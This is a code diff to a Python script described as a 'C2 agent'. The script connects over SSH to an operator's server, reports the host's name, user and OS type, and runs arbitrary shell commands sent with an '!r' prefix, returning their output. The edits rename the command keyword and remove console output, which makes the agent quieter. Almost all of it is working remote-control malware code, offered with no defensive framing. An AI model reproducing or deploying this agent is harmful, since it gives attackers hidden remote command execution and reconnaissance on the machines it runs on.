@@ -3,7 +3,7 @@ import subprocess
 import os
 import sys
 import socket
-import getpass
+from getpass import getuser
 import argparse
 
 parser = argparse.ArgumentParser(description="C2 agent configuration to communicate with server")
@@ -17,7 +17,7 @@ optional.add_argument("-pwd", dest="password", default="sshPass", help="Password
 
 args = parser.parse_args()
 
-def main():
+def Main():
     ip = args.ip #Server IP
     port = args.port #Server port
     username = args.user #Server username
@@ -30,7 +30,7 @@ def main():
         client.connect(ip, port=port, username=username, password=password)
         session = client.get_transport().open_session()
         host = socket.gethostname()
-        user = getpass.getuser()
+        user = getuser()
         type = os.name
     except Exception:
         print("[!] Unable to connect to server. Use -h for help.")
@@ -38,9 +38,10 @@ def main():
 
     if session.active:
         session.sendall(f"{host}{SEPARATOR}{user}{SEPARATOR}{type}")
-        print(session.recv(1024).decode())
+        session.recv(1024)
         while True:
             try:
+                output = ""
                 incoming = session.recv(1024).decode()
                 head = incoming.split(" ")[0]
                 if head == "!exit":
@@ -55,7 +56,7 @@ def main():
                         output = ""
                 elif head == "!pwd":
                     output = os.getcwd()
-                elif head == "!cmd":
+                elif head == "!r":
                     command = " ".join(incoming.split(" ")[1:])
                     output = subprocess.getoutput(command)
                 else:
@@ -69,4 +70,4 @@ def main():
                 session.sendall("[!] " + str(ex))
 
 if __name__ == "__main__":
-    main()
+    Main()
